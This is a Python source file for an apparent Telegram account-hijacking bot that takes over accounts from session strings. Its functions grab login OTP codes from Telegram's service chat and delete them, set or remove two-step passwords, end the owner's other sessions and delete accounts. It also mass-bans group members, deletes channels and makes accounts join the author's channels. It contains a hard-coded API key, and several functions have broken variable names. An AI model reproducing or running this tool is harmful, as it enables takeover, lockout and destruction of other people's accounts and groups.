import asyncio
import pyrogram
import telethon
from pyrogram import Client, enums
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
from pyrogram.types import ChatPrivileges
from telethon.sessions import StringSession
from telethon import TelegramClient, functions as ok
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.types import (
    ChatBannedRights, ChannelParticipantsAdmins, ChannelParticipantsBanned)
from telethon.tl.functions.channels import (
    EditBannedRequest, JoinChannelRequest as join,
    LeaveChannelRequest as leave, DeleteChannelRequest as dc,
    GetAdminedPublicChannelsRequest)


API_ID = 11573285
API_HASH = "f2cc3fdc32197c8fbaae9d0bf69d2033"


async def cu(session):
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as X:
                try:
                    await X(join("@TeamLegendBots"))
                    await X(join("@LegendBot_OP"))
                except BaseExeption:
                    pass
                return True
        else:
            async with Client(
                "newLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as X:
                try:
                    await X.join_chat("@TeamLegendBots")
                    await X.join_chat("@LegendBot_OP")
                except BaseException:
                    pass
                return True
    except Exception as e:
        print(e)
        return False


async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                k = await x(GetAdminedPublicChannelsRequest())
                for x in k.chats:
                    msg += f"**• Channel Name :** {x.title}\n**• Channel Username :** @{x.username}\n**• Participants  :** - {x.participants_count}\n\n"
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                k = await x.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f"**• Channel Name :** {x.title}\n**• Channel Username :** @{x.username}\n**• Participants :** {x.participants_count}\n\n"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error :** " + err + "\n**Try Again /hack.**"
    return msg


info = """
**• Name :** `{}`
**• ID:** `{}`
**• Phone Number:** `+{}`
**• Username:** `@{}`

• Check More Bots: @TeamLegendBots
• Update Channel: @LegendBot_AI
__Subscribe/Join This Both Channel to keep active this bot forever__
"""


async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as X:
                k = await X.get_me()
                msg = info.format(
                    (k.first_name if k.first_name else k.last_name),
                    k.id,
                    k.phone,
                    k.username if k.username else "No Username",
                )
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as X:
                k = await X.get_me()
                msg = info.format(
                    (k.first_name if k.first_name else k.last_name),
                    k.id,
                    k.phone_number,
                    k.username if k.username else "No Username",
                )
    except Exception as loler:
        err += str(loler)
    if err:
        return "**Error**: " + err + "\n**Try Again /hack.**"
    return msg


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)


async def banall(session, id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if isinstance(id.text, Str) else int(id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                admins = await x.get_participants(
                    gc_id, filter=ChannelParticipantsAdmins
                )
                admins_id = [i.id for i in admins]
                async for user in x.iter_participants(gc_id):
                    all += 1
                    try:
                        if user.id not in admins_id:
                            await x(EditBannedRequest(gc_id, user.id, RIGHTS))
                            bann += 1
                            await asyncio.sleep(0.1)
                    except Exception:
                        await asyncio.sleep(0.1)
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                async for members in x.get_chat_members(gc_id):
                    all += 1
                    try:
                        await x.ban_chat_member(gc_id, members.user.id)
                        bann += 1
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass

    except Exception as idk:
        err += str(idk)
    msg += f"**Users Banned Successfully ! \n\n • Total Banned Users:** {bann} \n **Total Users:** {all}"
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return msg


UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


async def unban_all(session, id):
    err = ""
    msg = ""
    all = 0
    unbann = 0
    gc_id = str(id.text) if isinstance(id.text, Str) else int(id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                async for user in x.iter_participants(ChannelParticipantsBanned):
                    all += 1
                    try:
                        await x(EditBannedRequest(gc_id, user.id, UNBAN_RIGHTS))
                        unbann += 1
                        await asyncio.sleep(0.1)
                    except Exception:
                        await asyncio.sleep(0.1)
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                async for members in x.get_chat_members(
                    group_id, filter=enums.ChatMembersFilter.BANNED
                ):
                    all += 1
                    try:
                        await x.unban_chat_member(gc_id, members.user.id)
                        bann += 1
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass

    except Exception as idk:
        err += str(idk)
    msg += f"**Users all Unbanned Successfully ! \n\n • Total Banned Users:** {unbann} \n **Total Users:** {all}"
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return msg


async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as X:
                async for o in X.iter_messages(777000, limit=2):
                    i += f"\n{o.text}\n"
                    await X.delete_dialog(777000)
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as X:
                ok = []
                async for message in X.get_chat_history(777000, limit=2):
                    i += f"\n{message.text}\n"
                    ok.append(message.id)
                await X.delete_messages(777000, ok)
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return i


async def join_ch(session, id):
    err = ""
    gc_id = str(id.text) if isinstance(id.text, Str) else int(id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x(join(gc_id))
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Joined Successfully !"


async def leave_ch(session, id):
    err = ""
    gc_id = str(id.text) if isinstance(id.text, Str) else int(id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x(leave(gc_id))
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Left Successfully!"


async def leave_all(session):
    err = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                async for dialog in x.iter_dialogs():
                    await x(leave(dialog.id))
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                async for dialog in client.get_dialogs():
                    await x.leave_chat(dialog.id)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Left all Successfully!"


async def del_ch(session, id):
    err = ""
    gc_id = str(id.text) if isinstance(id.text, Str) else int(id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x(dc(gc_id))
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.invoke(
                    functions.channels.DeleteChannel(
                        channel=await x.resolve_peer(gc_id)
                    )
                )

    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "**Deleted Succssfully!**"


async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                try:
                    await x.edit_2fa("LegendBoy is best")
                    i += "Two step verification is disable"
                except Exception as e:
                    i += "Two Step verification has been enabled"
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                yes = await x.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "Two Step Verification is Enable"
                else:
                    i += "Two Step Verification is disbaled "
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /info.**"
    return i


async def set_2fa(session, owo):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                try:
                    await x.edit_2fa(new_password=owo)
                    i += f"Two step verification is set successfully `{owo}`"
                except Exception as e:
                    i += "Already Two step verification is enabled"
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                try:
                    x.enable_cloud_password(owo)
                    i += f"Two step verification is set successfully `{owo}`"
                except Exception as e:
                    i += "Already Two step verification is enabled"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /info.**"
    return i


async def remove_2fa(session, owo):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                try:
                    await x.edit_2fa(current_password=owo)
                    i += f"Two step verification is successfully removed"
                except Exception as e:
                    i += "Your have entered incorrect password/Two step verification is not enabled"
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                try:
                    x.remove_cloud_password(owo)
                    i += f"Two step verification is successfully removed"
                except Exception as e:
                    i += "You have entered incorrect password/two step verification is not enabled"
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /info.**"
    return i


async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x(rt())
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Terminated all Session."


async def terminate_my(session):
    err = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x.log_out()
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.log_out()
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Terminated my Session."


async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as X:
                await X(ok.account.DeleteAccountRequest("Owner madarchod h"))
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.invoke(
                    functions.account.DeleteAccount(reason="madarchod hu me")
                )
    except Exception as idk:
        err += str(idk)
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Deleted Account ."


FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,
    can_invite_users=True,
)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
)


async def piromote(session, gc_id, user_id):
    err = ""
    gc_id = str(gc_id.text) if isinstance(gc_id.text, Str) else int(gc_id.text)
    user_id = str(user_id.text) if isinstance(user_id.text, Str) else int(user_id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                try:
                    await x.edit_admin(
                        gc_id,
                        user_id,
                        manage_call=True,
                        invite_users=True,
                        ban_users=True,
                        change_info=True,
                        edit_messages=True,
                        post_messages=True,
                        add_admins=True,
                        delete_messages=True,
                    )
                except BaseException:
                    await x.edit_admin(
                        gc_id,
                        user_id,
                        is_admin=True,
                        anonymous=False,
                        pin_messages=True,
                        title="Owner",
                    )
        else:
            async with Client(
                "NewLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                try:
                    await x.promote_chat_member(gc_id, user_id, FULL_PROMOTE_POWERS)
                except BaseException:
                    await x.promote_chat_member(gc_id, user_id, PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Promoted User."


DEMOTE = ChatPrivileges(
    can_change_info=False,
    can_invite_users=False,
    can_delete_messages=False,
    can_restrict_members=False,
    can_pin_messages=False,
    can_promote_members=False,
    can_manage_chat=False,
    can_manage_video_chats=False,
)


async def demote_user(session, gc_id, user_id):
    err = ""
    gc_id = str(gc_id.text) if isinstance(gc_id.text, Str) else int(gc_id.text)
    user_id = str(user_id.text) if isinstance(user_id.text, Str) else int(user_id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                try:
                    await x.edit_admin(
                        gc_id, user_id, is_admin=False, manage_call=False
                    )
                except BaseException:
                    await x.edit_admin(
                        gc_id,
                        user_id,
                        manage_call=False,
                        invite_users=False,
                        ban_users=False,
                        change_info=False,
                        edit_messages=False,
                        post_messages=False,
                        add_admins=False,
                        delete_messages=False,
                    )
        else:
            async with Client(
                "NeeLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.promote_chat_member(gc_id, user_id, DEMOTE)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Demoted Member."


async def demote_all(session, gc_id):
    err = ""
    gc_id = str(gc_id.text) if isinstance(gc_id.text, Str) else int(gc_id.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                async for o in x.iter_participants(
                    gc_id, filter=ChannelParticipantsAdmins
                ):
                    try:
                        await x.edit_admin(
                            gc_id, o.id, is_admin=False, manage_call=False
                        )
                    except BaseException:
                        await x.edit_admin(
                            gc_id,
                            o.id,
                            manage_call=False,
                            invite_users=False,
                            ban_users=False,
                            change_info=False,
                            edit_messages=False,
                            post_messages=False,
                            add_admins=False,
                            delete_messages=False,
                        )
        else:
            async with Client(
                "NeeLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                async for m in x.get_chat_members(
                    gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS
                ):
                    await x.promote_chat_member(gc_id, m.user.id, DEMOTE)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Demoted all."


async def broadcast(session, list, text):
    err = ""
    gc_id = str(text.text) if isinstance(text.text, Str) else int(text.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                i = 0
                for item in list:
                    i += 1
                if i < 25:
                    timer = 10
                if i < 50 and i > 25:
                    timer = 15
                if i < 100 and i > 50:
                    timer = 20
                if i < 200 and i > 100:
                    timer = 25
                await asyncio.sleep(timer)
                await x.send_message(item, text)
        else:
            async with Client(
                "NeeLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                i = 0
                for item in list:
                    i += 1
                if i < 25:
                    timer = 10
                if i < 50 and i > 25:
                    timer = 15
                if i < 100 and i > 50:
                    timer = 20
                if i < 200 and i > 100:
                    timer = 25
                await asyncio.sleep(timer)
                await x.send_message(item, text)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Broadcasted your message"


async def send_mess(session, user_id, text):
    err = ""
    user_id = str(user_id.text) if isinstance(user_id.text, Str) else int(uset_id.text)
    text = str(text.text) if isinstance(text.text, Str) else int(text.text)
    try:
        if session.endswith("="):
            if session.startswith("="):
                session = session[6:-5]
            async with TelegramClient(StringSession(session), API_ID, API_HASH) as x:
                await x.send_message(user_id, text)
        else:
            async with Client(
                "NeeLegend", api_id=API_ID, api_hash=API_HASH, session_string=session
            ) as x:
                await x.send_message(user_id, text)
    except Exception as idk:
        err += str(idk)

    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully sended your message"
